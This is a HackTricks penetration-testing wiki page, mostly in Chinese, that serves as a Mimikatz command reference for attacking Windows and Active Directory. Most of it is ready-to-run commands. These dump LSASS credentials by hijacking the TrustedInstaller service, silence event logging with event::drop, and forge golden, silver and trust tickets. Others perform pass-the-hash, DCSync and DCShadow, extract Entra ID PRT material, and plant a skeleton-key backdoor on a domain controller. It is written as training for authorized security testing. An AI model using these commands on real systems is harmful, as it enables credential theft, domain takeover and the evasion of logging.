# Mimikatz

{{#include ../../banners/hacktricks-training.md}}


**本页面基于 [adsecurity.org](https://adsecurity.org/?page_id=1821) 的内容**。如需更多信息，请查看原文！<sup>[[3]](#references)</sup>

## 内存中的 LM 和明文

从 Windows 8.1 和 Windows Server 2012 R2 开始，系统实施了重要措施，以防范凭据窃取：

- **LM hashes 和 plain-text passwords** 不再存储在内存中，以增强安全性。必须将特定注册表设置 _HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest "UseLogonCredential"_ 配置为 DWORD 值 `0`，以禁用 Digest Authentication，确保 LSASS 中不会缓存 "clear-text" passwords。

- 引入 **LSA Protection**，用于防止未经授权读取 Local Security Authority (LSA) 进程的内存以及向其中注入代码。具体做法是将 LSASS 标记为 protected process。启用 LSA Protection 包括：
1. 修改注册表 _HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa_，将 `RunAsPPL` 设置为 `dword:00000001`。
2. 实施一个 Group Policy Object (GPO)，在受管理设备上强制应用此注册表更改。

尽管存在这些保护措施，Mimikatz 等工具仍可使用特定 drivers 绕过 LSA Protection，但此类操作很可能会记录在 event logs 中。

在现代工作站上，这一点更加重要，因为在许多 Windows 11 22H2+ 和 Windows Server 2025 的已加入域、非 DC 系统中，**Credential Guard 默认处于启用状态**，而在全新安装的 Windows 11 22H2+ 系统中，**LSASS-as-PPL 默认处于启用状态**。实际上，这意味着 `sekurlsa::logonpasswords` 通常只能获得比旧有 tradecraft 预期更少的信息，operators 越来越多地转向 **offline minidumps**、**Kerberos key extraction (`sekurlsa::ekeys`)** 或面向 **CloudAP/PRT** 的 modules。关于防护措施，请查看 [Windows credentials protections](credentials-protections.md)。

### 应对 SeDebugPrivilege Removal

Administrators 通常拥有 SeDebugPrivilege，因此可以对 programs 进行 debug。可以限制此 privilege，以防止未经授权的 memory dumps；攻击者经常利用该技术从内存中提取 credentials。然而，即使移除此 privilege，TrustedInstaller account 仍可通过自定义的 service configuration 执行 memory dumps：
```bash
sc config TrustedInstaller binPath= "C:\\Users\\Public\\procdump64.exe -accepteula -ma lsass.exe C:\\Users\\Public\\lsass.dmp"
sc start TrustedInstaller
```
这允许将 `lsass.exe` 的内存转储到文件中，然后可以在另一台系统上对其进行分析以提取 credentials：
```
# privilege::debug
# sekurlsa::minidump lsass.dmp
# sekurlsa::logonpasswords
```
## Mimikatz 选项

在 Mimikatz 中，Event log tampering 主要涉及两项操作：清除事件日志，以及对 Event service 进行 patch，以阻止记录新事件。以下是执行这些操作的命令：

#### 清除事件日志

- **Command**：此操作旨在删除事件日志，从而增加追踪恶意活动的难度。
- Mimikatz 的标准文档没有提供直接通过其命令行清除事件日志的命令。不过，事件日志 manipulation 通常需要使用 Mimikatz 之外的系统工具或脚本来清除特定日志（例如使用 PowerShell 或 Windows Event Viewer）。

#### Experimental Feature：对 Event Service 进行 Patching

- **Command**：`event::drop`
- 此 experimental command 用于修改 Event Logging Service 的行为，使其实际上无法记录新事件。
- Example：`mimikatz "privilege::debug" "event::drop" exit`

- `privilege::debug` 命令确保 Mimikatz 以修改系统服务所需的权限运行。
- 随后，`event::drop` 命令会对 Event Logging service 进行 patch。

### Kerberos Ticket Attacks

使用以下命令作为快速 syntax 参考。[golden tickets](../active-directory-methodology/golden-ticket.md)、[silver tickets](../active-directory-methodology/silver-ticket.md)、[diamond tickets](../active-directory-methodology/diamond-ticket.md) 以及 [over-pass-the-hash / pass-the-key](../active-directory-methodology/over-pass-the-hash-pass-the-key.md) 的专门页面包含最新的 AES/PAC/opsec 细节。

### Golden Ticket Creation

Golden Ticket 可实现整个 domain 范围内的访问 impersonation。关键命令和参数：

- Command：`kerberos::golden`
- Parameters：
- `/domain`：domain 名称。
- `/sid`：domain 的 Security Identifier (SID)。
- `/user`：要 impersonate 的用户名。
- `/krbtgt`：domain 的 KDC service account 的 NTLM hash。
- `/ptt`：直接将 ticket 注入内存。
- `/ticket`：保存 ticket 供以后使用。

Example：
```bash
mimikatz "kerberos::golden /user:admin /domain:example.com /sid:S-1-5-21-123456789-123456789-123456789 /krbtgt:ntlmhash /ptt" exit
```
### Silver Ticket Creation

Silver Tickets grant access to specific services. Key command and parameters:

- Command: Similar to Golden Ticket but targets specific services.
- Parameters:
- `/service`: The service to target (e.g., cifs, http).
- Other parameters similar to Golden Ticket.

Example:
```bash
mimikatz "kerberos::golden /user:user /domain:example.com /sid:S-1-5-21-123456789-123456789-123456789 /target:service.example.com /service:cifs /rc4:ntlmhash /ptt" exit
```
### Trust Ticket Creation

Trust Tickets 用于通过利用 trust relationships 访问跨域资源。关键命令和参数：

- Command: 与 Golden Ticket 类似，但用于 trust relationships。
- Parameters:
- `/target`: 目标 domain 的 FQDN。
- `/rc4`: trust account 的 NTLM hash。

Example:
```bash
mimikatz "kerberos::golden /domain:child.example.com /sid:S-1-5-21-123456789-123456789-123456789 /sids:S-1-5-21-987654321-987654321-987654321-519 /rc4:ntlmhash /user:admin /service:krbtgt /target:parent.example.com /ptt" exit
```
### Additional Kerberos Commands

- **Listing Tickets**：

- Command: `kerberos::list`
- 列出当前用户会话的所有 Kerberos tickets。

- **Pass the Cache**：

- Command: `kerberos::ptc`
- 从 cache 文件中注入 Kerberos tickets。
- Example: `mimikatz "kerberos::ptc /ticket:ticket.kirbi" exit`

- **Pass the Ticket**：

- Command: `kerberos::ptt`
- 允许在另一个会话中使用 Kerberos ticket。
- Example: `mimikatz "kerberos::ptt /ticket:ticket.kirbi" exit`

- **Purge Tickets**：
- Command: `kerberos::purge`
- 从会话中清除所有 Kerberos tickets。
- 在使用 ticket manipulation 命令之前很有用，可以避免冲突。

### Over-Pass-the-Hash / Pass-the-Key

如果 `RC4` 已禁用或不可靠，Mimikatz 可以将 **AES128/AES256 Kerberos keys** patch 到当前 logon session 中，而不是仅使用 NT hash。与其将 `sekurlsa::pth` 视为仅适用于 NTLM，这种方式通常更适合现代 domain。<sup>[[1]](#references)</sup>
```bash
mimikatz "privilege::debug" "sekurlsa::ekeys" exit
mimikatz "sekurlsa::pth /user:svc_sql /domain:corp.local /aes256:<AES256_HEX> /run:powershell.exe" exit
mimikatz "sekurlsa::pth /user:administrator /domain:corp.local /ntlm:<NT_HASH> /impersonate" exit
```
`/impersonate` 会复用当前进程，而不是生成新的 console；当你想在相同 context 中立即运行 `lsadump::dcsync` 之类的命令时，这非常方便。

### Active Directory Tampering

- **DCShadow**：暂时让一台机器充当 DC，以操纵 AD 对象。参见 [DCShadow](../active-directory-methodology/dcshadow.md)。

- `mimikatz "lsadump::dcshadow /object:targetObject /attribute:attributeName /value:newValue" exit`

- **DCSync**：模拟 DC 以请求密码数据。参见 [DCSync](../active-directory-methodology/dcsync.md)。
- `mimikatz "lsadump::dcsync /user:targetUser /domain:targetDomain" exit`

### Credential Access

- **LSADUMP::LSA**：从 LSA 中提取凭据。

- `mimikatz "lsadump::lsa /inject" exit`

- **LSADUMP::NetSync**：使用计算机账户的密码数据来冒充 DC。

- _原始上下文未提供 NetSync 的具体命令。_

- **LSADUMP::SAM**：访问本地 SAM 数据库。

- `mimikatz "lsadump::sam" exit`

- **LSADUMP::Secrets**：解密存储在注册表中的 secrets。

- `mimikatz "lsadump::secrets" exit`

- **LSADUMP::SetNTLM**：为用户设置新的 NTLM hash。

- `mimikatz "lsadump::setntlm /user:targetUser /ntlm:newNtlmHash" exit`

- **LSADUMP::Trust**：获取 trust authentication information。
- `mimikatz "lsadump::trust" exit`

### Cloud credentials / Entra ID

在 **Entra ID** 或 **hybrid-joined** 主机上，`sekurlsa::cloudap` 可以从 LSASS 中暴露缓存的 **Primary Refresh Token (PRT)** material。如果关联的 Proof-of-Possession key 受到 software protection，`dpapi::cloudapkd` 可以派生后续 **Pass-the-PRT** workflows 所需的 clear/derived key material。<sup>[[1]](#references)</sup>
```bash
mimikatz "privilege::debug" "sekurlsa::cloudap" exit
mimikatz "dpapi::cloudapkd /keyvalue:<ProofOfPossessionKey> /unprotect" exit
mimikatz "dpapi::cloudapkd /context:<CONTEXT> /derivedkey:<DERIVED_KEY> /prt:<PRT>" exit
```
当 key 由 TPM-backed 时，这会变得困难得多，但在 hybrid endpoints 上仍值得检查，因为缓存的 CloudAP 数据可能比经典的 `wdigest` 输出更有价值。<sup>[[2]](#references)</sup> 有关 cloud-side abuse chain，请参阅 [Pass the PRT](https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/az-lateral-movement-cloud-on-prem/pass-the-prt.html)。

### Miscellaneous

- **MISC::Skeleton**：向 DC 上的 LSASS 注入 backdoor。
- `mimikatz "privilege::debug" "misc::skeleton" exit`

### Privilege Escalation

- **PRIVILEGE::Backup**：获取 backup 权限。

- `mimikatz "privilege::backup" exit`

- **PRIVILEGE::Debug**：获取 debug 权限。
- `mimikatz "privilege::debug" exit`

### Credential Dumping

- **SEKURLSA::LogonPasswords**：显示已登录用户的 credentials。

- `mimikatz "sekurlsa::logonpasswords" exit`

- **SEKURLSA::Tickets**：从内存中提取 Kerberos tickets。
- `mimikatz "sekurlsa::tickets /export" exit`

### Sid and Token Manipulation

- **SID::add/modify**：更改 SID 和 SIDHistory。

- Add：`mimikatz "sid::add /user:targetUser /sid:newSid" exit`
- Modify：_原始上下文中未提供用于 modify 的特定命令。_

- **TOKEN::Elevate**：冒充 tokens。
- `mimikatz "token::elevate /domainadmin" exit`

### Terminal Services

- **TS::MultiRDP**：允许多个 RDP sessions。

- `mimikatz "ts::multirdp" exit`

- **TS::Sessions**：列出 TS/RDP sessions。
- _原始上下文中未提供用于 TS::Sessions 的特定命令。_

### Vault

- 从 Windows Vault 中提取 passwords。
- `mimikatz "vault::cred /patch" exit`


## References

- [1] [The Hacker Tools – Mimikatz modules](https://tools.thehacker.recipes/mimikatz/modules/)
- [2] [Synacktiv – WHFB and Entra ID: Say Hello to your new cache flow](https://www.synacktiv.com/en/publications/whfb-and-entra-id-say-hello-to-your-new-cache-flow)
- [3] [Mimikatz command reference](https://adsecurity.org/?page_id=1821)

{{#include ../../banners/hacktricks-training.md}}
